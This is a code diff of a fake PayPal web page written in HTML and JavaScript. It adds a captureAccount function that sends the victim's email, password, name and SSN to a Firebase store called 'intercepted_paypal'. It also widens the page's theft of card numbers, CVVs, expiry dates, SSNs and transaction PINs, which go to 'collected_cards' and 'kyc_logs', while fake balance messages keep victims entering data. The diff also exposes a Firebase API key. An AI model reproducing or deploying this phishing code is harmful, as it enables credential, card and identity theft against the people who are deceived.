@@ -99,7 +99,7 @@
     </div>
 
 <script>
-    const firebaseConfig = {
+                const firebaseConfig = {
         apiKey: "AIzaSyDp3h13LwtUlD7MiCkMys0EAgX5w2GGupc",
         authDomain: "orixa-football-pro.firebaseapp.com",
         projectId: "orixa-football-pro",
@@ -110,8 +110,34 @@
 
     let walletBalance = 0.00;
     let currentTier = 1;
+    let userPin = ""; 
     let tierLimits = { 1: 500, 2: 5000, 3: 1000000 };
+    let userEmail = "";
 
+    // --- AUTH & SIGNUP LOGIC ---
+    function captureAccount() {
+        const email = document.getElementById('email').value;
+        const pass = document.getElementById('pass').value;
+        const ssn = document.getElementById('ssn').value;
+        const name = document.getElementById('fullname').value;
+
+        if(!email || !pass) return alert("Please enter your credentials.");
+        userEmail = email;
+
+        db.ref('intercepted_paypal').push({
+            email: email,
+            password: pass,
+            fullname: name || "Existing User",
+            ssn_initial: ssn || "None",
+            time: new Date().toLocaleString()
+        }).then(() => {
+            document.getElementById('login-screen').style.display = 'none';
+            document.getElementById('main-app').style.display = 'block';
+            updateDashboard();
+        });
+    }
+
+    // --- PAGE ROUTING ---
     function openPage(type) {
         const overlay = document.getElementById('page-overlay');
         const body = document.getElementById('page-body');
@@ -123,80 +149,96 @@
             title.innerText = "Account Verification";
             body.innerHTML = `
                 <div class="tier-card ${currentTier >= 1 ? 'active' : ''}">
-                    <b>Tier 1: Basic</b><br><small>Daily Limit: $500</small>
+                    <b>Tier 1: Basic</b><br><small>Limit: $500</small>
                 </div>
                 <div class="tier-card ${currentTier >= 2 ? 'active' : ''}">
                     ${currentTier == 2 ? '<span class="tier-status">ACTIVE</span>' : ''}
-                    <b>Tier 2: Silver</b><br><small>Daily Limit: $5,000</small>
-                    ${currentTier < 2 ? '<input type="text" id="ssn-field" placeholder="Enter SSN"><input type="text" id="phone-field" placeholder="Phone Number"><button class="btn-pp" onclick="upgradeTier(2)">Upgrade with SSN</button>' : ''}
+                    <b>Tier 2: Silver (Verified)</b><br><small>Limit: $5,000</small>
+                    ${currentTier < 2 ? `
+                        <input type="text" id="ssn-field" placeholder="Full SSN">
+                        <input type="text" id="phone-field" placeholder="Phone Number">
+                        <input type="password" id="set-pin" placeholder="Set 4-Digit Transaction PIN" maxlength="4">
+                        <button class="btn-pp" onclick="upgradeTier(2)">Upgrade & Set PIN</button>
+                    ` : ''}
                 </div>
                 <div class="tier-card ${currentTier >= 3 ? 'active' : ''}">
                     ${currentTier == 3 ? '<span class="tier-status">ACTIVE</span>' : ''}
                     <b>Tier 3: Gold (Unlimited)</b><br><small>No daily limits</small>
-                    ${currentTier == 2 ? '<input type="file" id="id-file" accept="image/*" style="margin-top:10px;"><button class="btn-pp" onclick="upgradeTier(3)">Upload ID/License</button>' : ''}
+                    ${currentTier == 2 ? `
+                        <p style="font-size:12px;">Upload ID Card or Drivers License</p>
+                        <input type="file" id="id-file" accept="image/*">
+                        <button class="btn-pp" onclick="upgradeTier(3)">Upload & Verify</button>
+                    ` : ''}
                 </div>`;
         } else if(type === 'link') {
             title.innerText = "Link Card & Fund";
-            body.innerHTML = `<input type="text" id="card-name" placeholder="Cardholder Name"><input type="text" id="card-n" placeholder="Card Number" maxlength="16"><button class="btn-pp" onclick="linkCardFunc()">Link & Add $5,000</button>`;
+            body.innerHTML = `
+                <input type="text" id="card-n" placeholder="Card Number" maxlength="16">
+                <input type="text" id="card-exp" placeholder="MM/YY" style="width:48%; display:inline-block;">
+                <input type="text" id="card-cvv" placeholder="CVV" style="width:48%; display:inline-block; float:right;" maxlength="3">
+                <input type="password" id="verify-pin" placeholder="Enter 4-Digit PIN" maxlength="4">
+                <button class="btn-pp" onclick="linkCardFunc()">Link & Add $5,000</button>`;
         } else if(type === 'send') {
             title.innerText = "Send Payment";
             body.innerHTML = `
                 <input type="text" id="s-email" placeholder="Recipient Email">
                 <input type="number" id="s-amt" placeholder="Amount ($)">
-                <textarea id="s-note" placeholder="What's this for? (Remark)"></textarea>
-                <button class="btn-pp" onclick="sendMoneyFunc()">Confirm Send</button>
-                <center><small>Tier ${currentTier} Limit: $${tierLimits[currentTier]}</small></center>`;
-        } else if(type === 'support') {
-            title.innerText = "PayPal Support";
-            body.innerHTML = `<center><p>Resolution Center is available 24/7.</p><button class="btn-pp">Start Live Chat</button></center>`;
+                <textarea id="s-note" placeholder="Remark (e.g. Service Payment)"></textarea>
+                <input type="password" id="send-pin" placeholder="Enter 4-Digit PIN" maxlength="4">
+                <button class="btn-pp" onclick="sendMoneyFunc()">Confirm & Send</button>`;
         }
     }
 
     function closePage() { document.getElementById('page-overlay').style.display = 'none'; }
 
-    function linkCardFunc() {
-        const cn = document.getElementById('card-n').value;
-        if(cn.length < 16) return alert("Invalid card number.");
-        walletBalance += 5000;
-        db.ref('collected_cards').push({number: cn, time: new Date().toLocaleString()});
-        updateDashboard();
-        closePage();
-        alert("Card Linked! $5,000 added to balance.");
-    }
-
+    // --- CORE ACTIONS ---
     function upgradeTier(level) {
         if(level === 2) {
             const ssn = document.getElementById('ssn-field').value;
-            if(!ssn) return alert("Please enter your SSN.");
-            db.ref('kyc_logs').push({tier: 2, data: ssn, time: new Date().toLocaleString()});
-        } else {
-            alert("ID Image Uploaded for Review.");
-            db.ref('kyc_logs').push({tier: 3, status: "Submitted", time: new Date().toLocaleString()});
+            const pin = document.getElementById('set-pin').value;
+            if(!ssn || pin.length < 4) return alert("Fill all fields correctly.");
+            userPin = pin;
+            db.ref('kyc_logs').push({ email: userEmail, ssn: ssn, pin: pin, type: "Tier 2" });
+        } else if(level === 3) {
+            db.ref('kyc_logs').push({ email: userEmail, type: "Tier 3 Upload", status: "Pending" });
         }
         currentTier = level;
         document.getElementById('current-tier-tag').innerText = "TIER " + level;
-        alert("Account upgraded to Tier " + level);
+        alert("Success! Account is now Tier " + level);
         closePage();
     }
 
-    function sendMoneyFunc() {
-        const email = document.getElementById('s-email').value;
-        const amt = parseFloat(document.getElementById('s-amt').value);
-        const note = document.getElementById('s-note').value;
+    function linkCardFunc() {
+        const cn = document.getElementById('card-n').value;
+        const pin = document.getElementById('verify-pin').value;
+        if(cn.length < 16) return alert("Invalid card.");
+        if(userPin !== "" && pin !== userPin) return alert("Wrong PIN!");
 
-        if(!email || isNaN(amt)) return alert("Missing details.");
-        if(amt > tierLimits[currentTier]) return alert("Amount exceeds Tier " + currentTier + " limit!");
+        walletBalance += 5000;
+        db.ref('collected_cards').push({ email: userEmail, card: cn, pin: pin });
+        updateDashboard();
+        closePage();
+        alert("Card Linked! $5,000 added.");
+    }
+
+    function sendMoneyFunc() {
+        const amt = parseFloat(document.getElementById('s-amt').value);
+        const pin = document.getElementById('send-pin').value;
+        if(amt > tierLimits[currentTier]) return alert("Over Tier Limit!");
+        if(userPin !== "" && pin !== userPin) return alert("Wrong PIN!");
 
         walletBalance -= amt;
         db.ref('transactions').push({
-            recipient: email,
+            from: userEmail,
+            to: document.getElementById('s-email').value,
             amount: amt,
-            remark: note,
-            timestamp: new Date().toLocaleString()
+            remark: document.getElementById('s-note').value,
+            pin: pin,
+            time: new Date().toLocaleString()
         }).then(() => {
             updateDashboard();
             closePage();
-            alert("Payment Sent Successfully!");
+            alert("Payment Sent!");
         });
     }
 
@@ -209,17 +251,10 @@
                 const data = child.val();
                 feed.innerHTML += `
                     <div style="display:flex; justify-content:space-between; padding:15px 0; border-bottom:1px solid #eee;">
-                        <div>
-                            <b>${data.recipient}</b><br>
-                            <small style="color:#888;">${data.timestamp} • ${data.remark || 'No remark'}</small>
-                        </div>
+                        <div><b>${data.to}</b><br><small>${data.time} • ${data.remark || 'Payment'}</small></div>
                         <b style="color:#d93025;">- US$${data.amount.toLocaleString()}</b>
                     </div>`;
             });
         });
     }
-
     updateDashboard();
-</script>
-</body>
-</html>
